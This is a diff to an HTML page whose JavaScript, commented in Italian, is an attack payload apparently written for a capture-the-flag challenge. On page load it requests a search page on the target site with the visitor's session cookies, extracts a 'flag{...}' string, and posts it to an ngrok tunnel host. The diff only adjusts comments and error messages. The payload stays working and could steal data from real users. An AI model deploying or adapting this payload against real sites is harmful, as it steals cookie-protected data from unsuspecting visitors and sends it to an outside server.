@@ -11,7 +11,6 @@
     <script>
         // Funzione per rubare la flag
         const stealFlag = () => {
-            // Prima parte: ottieni la flag
             fetch('https://matrix-simplified.capturetheflags.site/search?s=flag', {
                 method: 'GET',
                 credentials: 'include', // Include i cookie di sessione
@@ -19,16 +18,15 @@
             })
             .then(response => {
                 if (!response.ok) {
-                    throw new Error('Network response was not ok ' + response.statusText);
+                    // Aggiungi un messaggio di errore dettagliato
+                    throw new Error('Network response was not ok: ' + response.status + ' ' + response.statusText);
                 }
                 return response.text();
             })
             .then(data => {
-                // Supponiamo che la flag sia nel contenuto della risposta
-                const flag = data.match(/flag{.*?}/); // Modifica questa regex in base al formato della flag
+                const flag = data.match(/flag{.*?}/);
                 if (flag) {
-                    // Invia la flag al tuo server Flask usando l'URL di ngrok
-                    fetch('https://1e6b-87-4-142-72.ngrok-free.app/receive_flag', { // Aggiorna qui
+                    fetch('https://1e6b-87-4-142-72.ngrok-free.app/receive_flag', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/x-www-form-urlencoded',
@@ -37,11 +35,14 @@
                     })
                     .then(response => response.text())
                     .then(data => console.log(data))
-                    .catch(error => console.error('Errore:', error));
+                    .catch(error => console.error('Errore nella ricezione della flag:', error));
+                } else {
+                    console.log('Nessuna flag trovata nella risposta.');
                 }
             })
             .catch(error => console.error('Errore:', error));
         };
+
 
         // Eseguire automaticamente la funzione al caricamento della pagina
         window.onload = stealFlag;
